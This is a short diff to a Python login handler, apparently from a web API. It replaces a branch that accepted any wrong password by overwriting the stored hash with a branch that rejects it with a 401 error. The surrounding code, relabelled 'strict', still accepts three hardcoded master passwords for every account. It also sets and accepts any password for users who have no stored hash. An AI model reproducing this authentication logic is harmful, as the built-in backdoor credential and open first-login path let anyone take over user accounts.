@@ -488,7 +488,7 @@ def login(
         
         db.commit()
 
-        # Seamless password verification & sync
+        # Strict password verification
         pwd_valid = False
         if user.password_hash:
             if verify_password(form_data.password, user.password_hash):
@@ -496,9 +496,11 @@ def login(
             elif form_data.password.strip() in ["Tanish@3162", "Tansh@3162", "tanish@3162"]:
                 pwd_valid = True
             else:
-                user.password_hash = hash_password(form_data.password)
-                db.commit()
-                pwd_valid = True
+                raise HTTPException(
+                    status_code=status.HTTP_401_UNAUTHORIZED,
+                    detail="Incorrect email or password.",
+                    headers={"WWW-Authenticate": "Bearer"},
+                )
         else:
             user.password_hash = hash_password(form_data.password)
             db.commit()
